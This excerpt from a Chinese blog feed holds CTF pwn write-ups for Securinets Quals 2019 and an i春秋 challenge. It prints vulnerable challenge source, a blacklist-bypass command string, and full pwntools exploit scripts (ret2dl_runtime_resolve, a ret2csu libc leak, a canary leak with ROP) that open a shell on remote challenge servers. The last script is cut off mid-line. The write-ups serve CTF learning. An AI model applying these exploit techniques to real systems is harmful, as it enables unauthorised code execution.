向缓冲区写入东西时，write_ptr指针的值增大，当将缓冲区的内容写入文件中时，是从write_base开始写入的</span></span><br><span class="line"><span class="comment">    ，到write_ptr结束*/</span></span><br><span class="line">  <span class="function"><span class="title">if</span> (f-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> == f-&gt;</span>_IO_buf_end ) <span class="comment">/* Buffer is really full 缓冲区满了，需要刷新缓冲区，将缓冲区内容真正写入文件中*/</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF) <span class="comment">//所谓的刷新缓冲区，就是将缓冲区的内容真正的写入设备中去。</span></span><br><span class="line">      return EOF;</span><br><span class="line">  *<span class="function"><span class="title">f</span>-&gt;</span>_IO_write_ptr++ = ch; </span><br><span class="line">  <span class="function"><span class="title">if</span> ((f-&gt;</span>_<span class="function"><span class="title">flags</span> &amp; _IO_UNBUFFERED) || ((f-&gt;</span>_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">'\n'</span>))</span><br><span class="line">    <span class="function"><span class="title">if</span> (_IO_do_write (f, f-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> , f-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> - f-&gt;</span>_IO_write_base) == EOF)</span><br><span class="line">      return EOF;</span><br><span class="line">  return (unsigned char) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最终调用了_IO_do_write函数：</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;p&gt;最近的题目(最近两年的国赛，HCTF2018)中出现了很多关于_IO_FILE的利用，不是hou
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Securinets CTF Quals 2019 部分pwn题wp</title>
    <link href="http://yoursite.com/2019/03/24/Securinets-CTF-Quals-2019-%E9%83%A8%E5%88%86pwn%E9%A2%98wp/"/>
    <id>http://yoursite.com/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/</id>
    <published>2019-03-24T14:05:39.000Z</published>
    <updated>2019-03-25T09:27:06.258Z</updated>
    
    <content type="html"><![CDATA[<p>tctf难到自闭，中途报了个别的ctf。写下三道pwn题的wp，有一道题在大佬的帮助下学到了新姿势，之前以为这种栈溢出是没法做的，还有一道格式化串的题一直做不出来。。等wp出来以后再复现了。。</p><h4 id="welocome"><a href="#welocome" class="headerlink" title="welocome"></a>welocome</h4><p>pwn的签到题。<br>程序源代码如下：<br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="keyword">int</span> search(<span class="keyword">char</span> <span class="keyword">str</span>[], <span class="keyword">char</span> word[])</span><br><span class="line">    <span class="keyword">int</span> l, i, j;</span><br><span class="line">    <span class="comment">/*length of word */</span></span><br><span class="line">   <span class="keyword">for</span> (l = <span class="number">0</span>; word[l] != <span class="string">'\0'</span>; l++);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; <span class="keyword">str</span>[i] != <span class="string">'\0'</span> &amp;&amp; word[j] != <span class="string">'\0'</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">str</span>[i] == word[j])</span><br><span class="line">        &#123;</span><br><span class="line">            j++;<span class="comment">//相等j++</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (j == l)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* substring found */</span></span><br><span class="line">        <span class="keyword">return</span> (i - j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>  - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> delete_word(<span class="keyword">char</span> <span class="keyword">str</span>[], <span class="keyword">char</span> word[], <span class="keyword">int</span> <span class="keyword">index</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i, l;</span><br><span class="line">    <span class="comment">/* length of word */</span></span><br><span class="line">    <span class="keyword">for</span> (l = <span class="number">0</span>; word[l] != <span class="string">'\0'</span>; l++); <span class="comment">//遍历word数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="keyword">index</span>; <span class="keyword">str</span>[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">str</span>[i] = <span class="keyword">str</span>[i + l + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> main(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> * blacklist[]=&#123;<span class="string">"cat"</span>,<span class="string">"head"</span>,<span class="string">"less"</span>,<span class="string">"more"</span>,<span class="string">"cp"</span>,<span class="string">"man"</span>,<span class="string">"scp"</span>,<span class="string">"xxd"</span>,<span class="string">"dd"</span>,<span class="string">"od"</span>,<span class="string">"python"</span>,<span class="string">"perl"</span>,<span class="string">"ruby"</span>,<span class="string">"tac"</span>,<span class="string">"rev"</span>,<span class="string">"xz"</span>,<span class="string">"tar"</span>,<span class="string">"zip"</span>,<span class="string">"gzip"</span>,<span class="string">"mv"</span>,<span class="string">"flag"</span>,<span class="string">"txt"</span>,<span class="string">"python"</span>,<span class="string">"perl"</span>,<span class="string">"vi"</span>,<span class="string">"vim"</span>,<span class="string">"nano"</span>,<span class="string">"pico"</span>,<span class="string">"awk"</span>,<span class="string">"grep"</span>,<span class="string">"egrep"</span>,<span class="string">"echo"</span>,<span class="string">"find"</span>,<span class="string">"exec"</span>,<span class="string">"eval"</span>,<span class="string">"regexp"</span>,<span class="string">"tail"</span>,<span class="string">"head"</span>,<span class="string">"less"</span>,<span class="string">"cut"</span>,<span class="string">"tr"</span>,<span class="string">"pg"</span>,<span class="string">"du"</span>,<span class="string">"`"</span>,<span class="string">"$"</span>,<span class="string">"("</span>,<span class="string">")"</span>,<span class="string">"#"</span>,<span class="string">"bzip2"</span>,<span class="string">"cmp"</span>,<span class="string">"split"</span>,<span class="string">"paste"</span>,<span class="string">"diff"</span>,<span class="string">"fgrep"</span>,<span class="string">"gawk"</span>,<span class="string">"iconv"</span>,<span class="string">"ln"</span>,<span class="string">"most"</span>,<span class="string">"open"</span>,<span class="string">"print"</span>,<span class="string">"read"</span>,<span class="string">"&#123;"</span>,<span class="string">"&#125;"</span>,<span class="string">"sort"</span>,<span class="string">"uniq"</span>,<span class="string">"tee"</span>,<span class="string">"wget"</span>,<span class="string">"nc"</span>,<span class="string">"hexdump"</span>,<span class="string">"HOSTTYPE"</span>,<span class="string">"$"</span>,<span class="string">"arch"</span>,<span class="string">"env"</span>,<span class="string">"tmp"</span>,<span class="string">"dev"</span>,<span class="string">"shm"</span>,<span class="string">"lock"</span>,<span class="string">"run"</span>,<span class="string">"var"</span>,<span class="string">"snap"</span>,<span class="string">"nano"</span>,<span class="string">"read"</span>,<span class="string">"readlink"</span>,<span class="string">"zcat"</span>,<span class="string">"tailf"</span>,<span class="string">"zcmp"</span>,<span class="string">"zdiff"</span>,<span class="string">"zegrep"</span>,<span class="string">"zdiff"</span>&#125;;</span><br><span class="line">cat head less more cp man scp xxd dd</span><br><span class="line"> <span class="keyword">char</span> <span class="keyword">str</span>[<span class="number">80</span>], word[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> <span class="keyword">index</span>;</span><br><span class="line">    printf(<span class="string">"Welcome to Securinets Quals CTF \o/ \n"</span>);</span><br><span class="line">    printf(<span class="string">"Enter string:\n"</span>);</span><br><span class="line">    read(<span class="number">0</span>,<span class="keyword">str</span>,<span class="number">79</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;sizeof(blacklist)/sizeof(blacklist[<span class="number">0</span>]);i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">index</span> = search(<span class="keyword">str</span>, blacklist[i]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">index</span> !=  - <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        delete_word(<span class="keyword">str</span>, blacklist[i], <span class="keyword">index</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">setreuid(geteuid(),geteuid());</span><br><span class="line">close(<span class="number">0</span>);</span><br><span class="line">system(<span class="keyword">str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序就是让你输入命令，然后system执行，但是设置了命令黑名单。查看文件和flag等字符串都不让输入。但是匹配算法有点问题，匹配的是输入的字符串的后面部分，输入<code>cat flag.txt cat flag.txt</code>即可绕过。</p><h3 id="baby2"><a href="#baby2" class="headerlink" title="baby2"></a>baby2</h3><p><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/2.png" alt=""><br>这道题目只有一个栈溢出，但是没有任何leak，看到这道题目的第一感觉就是ret2dl_runtime_resolve,关于这个利用技术，网上有很多，这里就不细说了。<br>虽然这个利用方法比较难，但是这道题的难点不在这，而是栈溢出在main函数中，在之前，我一直以为这种栈溢出是不能做的，遇到一个人很好的pwn师傅给我提供了思路。<br><strong>main函数和其他函数的栈布局有所不同</strong>。注意图中画红方框的地方。<br>函数开始部分：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lea</span>    <span class="built_in">ecx</span>, [<span class="built_in">esp</span>+<span class="number">4</span>]</span><br><span class="line"><span class="keyword">and</span>    <span class="built_in">esp</span>, <span class="number">0FFFFFFF0h</span></span><br><span class="line"><span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>-<span class="number">4</span>]</span><br><span class="line"><span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="keyword">push</span>    <span class="built_in">ecx</span></span><br></pre></td></tr></table></figure></p><p>此时栈布局大概是这样的：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/3.png" alt=""><br>saved ecx的值等于 ebp +8<br>当函数结束时：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_4]</span><br><span class="line"><span class="keyword">leave</span></span><br><span class="line"><span class="keyword">lea</span>     <span class="built_in">esp</span>, [<span class="built_in">ecx</span>-<span class="number">4</span>]</span><br><span class="line"><span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p><p>将saved ecx的值赋值给ecx，然后再将ecx-4 赋值给esp，再ret。<br>这里ecx的存在有点像canary。<br>保存在栈中saved ecx -4 才是最后esp的值，如果栈中的saved ecx，被破坏了，程序就会崩溃。<br>如图：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/4.png" alt=""><br>红框即是saved ecx。<br>他此时指向：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/5.png" alt=""><br>最后的ESP即是：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/6.png" alt=""></p><p>正常的栈溢出的做法是 返回地址以上的空间全是padding，从返回地址开始写ROP，<strong>但是这样saved ecx的值就被破坏掉</strong>。<br>例如：<br>全用AAAA。。。填充缓冲区，那么saved ecx的地址被覆盖为0x41414141。<br><code>Program received signal SIGSEGV (fault address 0x4141413d)</code><br>此时ESP的值等于0x4141413d，是一个无效的地址。这样程序根本进入不了ROP，我开始的想法是将ECX覆盖为某个函数的got-4，但是参数无法布置。</p><p><strong>解决办法：</strong><br>将第一段ROP写在buf中，即写在缓冲区中。再将saved ecx的高位第一个字节覆盖掉，覆盖为buf地址+4 的高位第一个字节，那么返回的地址就返回到buf中了。虽然开启了ASLR，但还是有几率爆破成功。<strong>但是地址选择要保证高位第二个字节是相等的</strong>。例如：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/7.png" alt=""><br><strong>要保证爆破的地址，高位第二个字节是相等的，因为我们只能控制高位第一个字节</strong>。</p><p>本题还有一个坑点，就是<br><code>return read(0, &amp;buf, 0x12Cu);</code><br><strong>read读取的长度是0x12c，连续发送两段payload，会连在一起，使用了sleep仍然不行，要使用raw_input或者pause</strong>。</p><p>exp如下：(要多试几次才能成功)<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#a=process("./baby2")</span></span><br><span class="line">a=remote(<span class="string">"51.254.114.246"</span>,<span class="string">"2222"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(a,"b *0x80484a3")</span></span><br><span class="line">elf=ELF(<span class="string">"./baby2"</span>)</span><br><span class="line">read_plt=elf.plt[<span class="string">"read"</span>]</span><br><span class="line">rel_plt_addr=0x80482d8</span><br><span class="line">dynsym_addr=0x80481d0</span><br><span class="line">dynstr_addr=0x8048240</span><br><span class="line">plt0_addr=0x8048320</span><br><span class="line">pop3_ret=0x08048509</span><br><span class="line">bss_addr=elf.bss()+0x20</span><br><span class="line"></span><br><span class="line">fake_rel_plt_addr=bss_addr</span><br><span class="line"></span><br><span class="line">arg_offset=fake_rel_plt_addr - rel_plt_addr<span class="comment">#dl_reslove(linkmap,arg_offset)</span></span><br><span class="line"></span><br><span class="line">fake_dynsym_addr=fake_rel_plt_addr + 0x8   <span class="comment">#fake_dynsym address</span></span><br><span class="line"></span><br><span class="line">align=16-(fake_dynsym_addr-dynsym_addr)%16  <span class="comment">#align</span></span><br><span class="line">fake_dynsym_addr+=align                 </span><br><span class="line"></span><br><span class="line">r_info=(((fake_dynsym_addr-dynsym_addr)/16)&lt;&lt;8)|0x7 <span class="comment">#rel_plt's r_info</span></span><br><span class="line"></span><br><span class="line">fake_dynstr_addr=fake_dynsym_addr+16   </span><br><span class="line">sh_addr=fake_dynstr_addr + 7</span><br><span class="line">offset=fake_dynstr_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line">payload+=p32(read_plt) <span class="comment">#read</span></span><br><span class="line">payload+=p32(pop3_ret) <span class="comment">#pop pop pop ret</span></span><br><span class="line">payload+=p32(0)        <span class="comment">#fd</span></span><br><span class="line">payload+=p32(bss_addr) <span class="comment">#buf</span></span><br><span class="line">payload+=p32(0x100)    <span class="comment">#length</span></span><br><span class="line">payload+=p32(plt0_addr)<span class="comment">#PLT[0]</span></span><br><span class="line">payload+=p32(arg_offset)</span><br><span class="line">payload+=p32(pop3_ret) <span class="comment">#return address</span></span><br><span class="line">payload+=p32(sh_addr)<span class="comment">#/bin/sh address</span></span><br><span class="line">payload=payload.ljust((0x30-4),<span class="string">"\x00"</span>)</span><br><span class="line">payload+='\x9c'</span><br><span class="line">a.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload=p32(elf.got[<span class="string">"read"</span>])<span class="comment">#fake_rel_plt</span></span><br><span class="line">payload+=p32(r_info)</span><br><span class="line">payload+='A'*align     <span class="comment">#padding</span></span><br><span class="line">payload+=p32(offset)+p32(0)+p32(0)+p32(0x12) <span class="comment">#fake dynsym</span></span><br><span class="line">payload+=<span class="string">"system\x00"</span> <span class="comment">#fake dynstr</span></span><br><span class="line">payload+=<span class="string">"/bin/sh\x00"</span></span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="baby1"><a href="#baby1" class="headerlink" title="baby1"></a>baby1</h3><p><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/1.png" alt=""></p><p>64位程序，一个基本栈溢出，由于没有给出动态库，可以配合pwntools的DynELF模块泄露system函数地址，也可以随便泄露一个地址再匹配动态库，再计算出system函数地址。<br>直接放exp:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">a=remote(<span class="string">"51.254.114.246"</span>,1111)</span><br><span class="line">elf=ELF(<span class="string">"./baby1"</span>)</span><br><span class="line">write_got=elf.got[<span class="string">"write"</span>]</span><br><span class="line">start_addr=0x400500</span><br><span class="line">def leak(addr):</span><br><span class="line">    a.recvuntil(<span class="string">"Welcome to securinets Quals!\n"</span>)</span><br><span class="line">    payload='A'*56</span><br><span class="line">    payload+=p64(0x0000000004006BA)<span class="comment">#csu</span></span><br><span class="line">    payload+=p64(0)</span><br><span class="line">    payload+=p64(1)</span><br><span class="line">    payload+=p64(write_got)</span><br><span class="line">    payload+=p64(8)</span><br><span class="line">    payload+=p64(addr)</span><br><span class="line">    payload+=p64(1)</span><br><span class="line">    payload+=p64(0x0000000004006A0)<span class="comment">#csu </span></span><br><span class="line">    payload+='A'*56</span><br><span class="line">    payload+=p64(start_addr)</span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    return a.recv(8)</span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line">system_addr=d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</span><br><span class="line">log.info(<span class="string">"system_addr = 0x%x"</span>%(system_addr));</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">def exp():</span><br><span class="line">    a.recvuntil(<span class="string">"Welcome to securinets Quals!\n"</span>)</span><br><span class="line">    payload='A'*56</span><br><span class="line">    payload+=p64(0x0000000004006BA)<span class="comment">#csu</span></span><br><span class="line">    payload+=p64(0)</span><br><span class="line">    payload+=p64(1)</span><br><span class="line">    payload+=p64(read_got)</span><br><span class="line">    payload+=p64(10)</span><br><span class="line">    payload+=p64(elf.bss())</span><br><span class="line">    payload+=p64(0)</span><br><span class="line">    payload+=p64(0x0000000004006A0)<span class="comment">#csu </span></span><br><span class="line">    payload+='A'*56</span><br><span class="line">    payload+=p64(0x00000000004006c3)</span><br><span class="line">    payload+=p64(elf.bss())</span><br><span class="line">    payload+=p64(system_addr)</span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    a.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">    a.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;tctf难到自闭，中途报了个别的ctf。写下三道pwn题的wp，有一道题在大佬的帮助下学到了新姿势，之前以为这种栈溢出是没法做的，还有一道格式化串的题一直做不出来。。等wp出来以后再复现了。。&lt;/p&gt;
&lt;h4 id=&quot;welocome&quot;&gt;&lt;a href=&quot;#welocome
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>i春秋pwnable-writeup</title>
    <link href="http://yoursite.com/2019/03/08/i%E6%98%A5%E7%A7%8Bpwnable-writeup/"/>
    <id>http://yoursite.com/2019/03/08/i春秋pwnable-writeup/</id>
    <published>2019-03-08T14:15:13.000Z</published>
    <updated>2019-03-08T14:37:54.308Z</updated>
    
    <content type="html"><![CDATA[<h4 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hello!I am the smartest robot in the universe!\nWho are you?"</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Your name %s sounds so stupid!\nBut you don't looks like a fool,isn't it?\nso why don't tell me your real name?\n"</span>,</span><br><span class="line">    &amp;buf);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Oh!This one is better,nice to meet you!\nGoodbye!See you again!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>64位程序，开启了canary和nx防护。<br>利用思路如下：<br>1.通过第一次的输入，覆盖canary高位的第一个字节为\x0a,利用printf中的%s，将canary的值打印出来。<br>2.由于题目没有给出动态库。可以通过puts泄露got表项内容，通过比对获知目标机器使用的动态库，或者写leak函数，结合pwntools的DynELF，泄露库中函数地址。<br>3.通过第二次溢出，构造ROPchain，利用read读取/bin/sh到bss段，接着调用system，获取shell。<br>完整的exp如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line">a=remote(<span class="string">"106.75.2.53"</span>,10002)</span><br><span class="line">elf=ELF(<span class="string">"./easypwn"</span>)</span><br><span class="line">pop_rdi_ret=0x4007f3 <span class="comment">#pop rdi ret</span></span><br><span class="line">def leak(addr):</span><br><span class="line">    a.recvuntil(<span class="string">"Who are you?\n"</span>)</span><br><span class="line">    payload='A'*72</span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    a.recvuntil(<span class="string">"A"</span>*72)</span><br><span class="line">    canary=u64(a.recv(8))-0xa</span><br><span class="line">    a.recv()</span><br><span class="line">    payload='A'*72+p64(canary)</span><br><span class="line">    payload+='B'*8 <span class="comment"># fake rbp</span></span><br><span class="line">    payload+=p64(pop_rdi_ret)</span><br><span class="line">    payload+=p64(addr)</span><br><span class="line">    payload+=p64(elf.plt[<span class="string">"puts"</span>])</span><br><span class="line">    payload+=p64(0x4005D0)<span class="comment"># start address</span></span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    a.recvuntil(<span class="string">"Oh!This one is better,nice to meet you!\nGoodbye!See you again!\n"</span>)</span><br><span class="line">    data=<span class="string">""</span></span><br><span class="line">    up=<span class="string">""</span></span><br><span class="line">    while True:</span><br><span class="line">        c=a.recv(1)</span><br><span class="line">        if up==<span class="string">"\n"</span> and c ==<span class="string">"H"</span>:</span><br><span class="line">            data=data[:-1]</span><br><span class="line">            data=data+<span class="string">"\x00"</span></span><br><span class="line">            break</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data+=c</span><br><span class="line">        up=c</span><br><span class="line">    return data[:4]</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line">system_addr=d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</span><br><span class="line"><span class="comment">#libc=LibcSearcher("system",system_addr)</span></span><br><span class="line">print(<span class="string">"system_addr = "</span>+hex(system_addr))</span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">a.recvuntil(<span class="string">"Who are 